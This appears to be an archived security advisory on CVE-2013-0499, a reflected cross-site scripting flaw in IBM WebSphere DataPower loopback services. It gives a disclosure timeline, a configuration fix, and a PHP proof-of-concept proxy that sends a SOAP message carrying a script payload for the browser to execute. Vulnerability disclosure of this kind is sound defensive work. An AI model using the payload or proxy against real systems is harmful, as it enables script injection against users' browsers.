@@ -1,0 +1,132 @@
+id: 20800
+date: 05/24/2013
+title: IBM WebSphere DataPower 3.8.2 / 4.0.x / 5.0 Cross Site Scripting
+author: A. Falkenberg
+cves: CVE-2013-0499
+
+=======================================================================
+              title: JavaScript Execution in WebSphere DataPower Services
+            product: IBM WebSphere DataPower Integration Appliance XI50
+ vulnerable version: 3.8.2, 4.0, 4.0.1, 4.0.2, 5.0.0
+      fixed version: not available, config changes
+         CVE number: CVE-2013-0499
+             impact: Low/Medium
+           homepage: https://www.ibm.com/
+              found: 2013-01-28
+                 by: A. Falkenberg
+                     SEC Consult Vulnerability Lab
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor/product description:
+-----------------------------
+WebSphere® DataPower® appliances simplify, govern, and optimize the delivery 
+of services and applications and enhance the security of XML and IT services.
+They extend the capabilities of an infrastructure by providing a multitude of
+functions.
+URL: http://www-03.ibm.com/software/products/us/en/datapower/
+
+
+Vulnerability overview/description:
+-----------------------------------
+For the purposes of debugging, DataPower provides configuration options to 
+echo requests received from the client. For example, XML Firewall service can
+be configured to echo requests by choosing the backend as 'loopback'. Other 
+services like Multi Protocol Gateway and Web Service Proxy can be configured 
+to echo requests by setting the variable “var://service/mpgw/skip-backside” in 
+its processing policy. 
+In such configurations, the requests are not sent to a backend server. Without 
+adequate validation and processing, the requests may be echoed back to the 
+client. Loopback services that blindly echo requests should only be used for 
+debugging purposes and not intended to be run in production environments as 
+they can result in potential security threats. For example, if an arbitrary 
+JavaScript embedded request is sent to such services, they will simply echo it
+back resulting in a potential JavaScript execution vulnerability in the 
+client's browser.
+URL: https://www-304.ibm.com/support/docview.wss?uid=swg21637717
+
+
+Proof of concept:
+-----------------
+The proof of concept was tested on an IBM Xi50 with the backend configured as 
+a "loopback" Web Service. The "loopback" Web Service can be used to execute 
+arbitrary JavaSscript code in a victims browser. Any valid SOAP message sent 
+to the Web service is returned unmodified to the receiver. If the SOAP 
+response of the "loopback" Web Service is parsed by a browser, any JavaScript
+that is contained within the XML document will get executed. 
+The following PHP script demonstrates a reflected cross site scripting.
+
+<?php
+$soapEndpoint = "http://127.0.0.1:80";
+$soapMessage = 
+'<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:sam="http://sample02.policy.samples.rampart.apache.org">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <sam:echo>
+        <html:html xmlns:html="http://www.w3.org/1999/xhtml">
+            <html:script>alert("XML XSS");</html:script>
+        </html:html>
+      </sam:echo>
+   </soapenv:Body>
+</soapenv:Envelope>';
+
+if(isset($_POST['soapMessage']) and isset($_POST['soapUrl'])){
+$soap_do = curl_init(); 
+  curl_setopt($soap_do, CURLOPT_URL,            $_POST['soapUrl'] );   
+  curl_setopt($soap_do, CURLOPT_CONNECTTIMEOUT, 10); 
+  curl_setopt($soap_do, CURLOPT_TIMEOUT,        10); 
+  curl_setopt($soap_do, CURLOPT_RETURNTRANSFER, true );
+  curl_setopt($soap_do, CURLOPT_SSL_VERIFYPEER, false);  
+  curl_setopt($soap_do, CURLOPT_SSL_VERIFYHOST, false); 
+  curl_setopt($soap_do, CURLOPT_POST,           true ); 
+  curl_setopt($soap_do, CURLOPT_POSTFIELDS,    $_POST['soapMessage']); 
+  curl_setopt($soap_do, CURLOPT_HTTPHEADER,     array('Content-Type: text/xml; charset=utf-8', 'Content-Length: '.strlen($_POST['soapMessage']) )); 
+
+  $result = curl_exec($soap_do);
+  $err = curl_error($soap_do);  
+
+        header('Content-type: text/xml');
+  echo $result;
+        exit;
+}
+?>
+
+<html>
+    <body>
+        <h1>XSS XML Proxy</h1>
+        <form name="input" action="" method="post">
+        SOAP Endpoint: <input type="text" name="soapUrl" value="<?php echo $soapEndpoint; ?>"><br />
+        SOAP Message:&nbps; <textarea cols="70" name="soapMessage" rows="14"><?php echo $soapMessage; ?></textarea><br />
+        <br />
+        <input type="submit" value="Submit">
+        </form> 
+    </body>
+</html>
+
+
+
+Vulnerable / tested versions:
+-----------------------------
+SEC Consult verified the vulnerability in the WebSphere DataPower Appliance XI50. 
+The vendor provided an extended list of vulnerable versions: 
+WebSphere DataPower 3.8.2, 4.0, 4.0.1, 4.0.2, 5.0.0.
+
+
+
+Vendor contact timeline:
+------------------------
+2013-01-30: Sending advisory and proof of concept exploit via encrypted channel.
+2013-01-31: Vendor confirms receipt
+2013-05-17: Vendor posts security bulletin
+2013-05-23: SEC Consult releases coordinated security advisory.
+
+
+Solution:
+---------
+The vendor does not offer a patch. 
+
+The vulnerability can be prevented by disabling the services to blindly echo
+requests back. A detailed description can be found on the vendor's site:
+https://www-304.ibm.com/support/docview.wss?uid=swg21637717
+
+#  0day.today [2023-03-25]  #
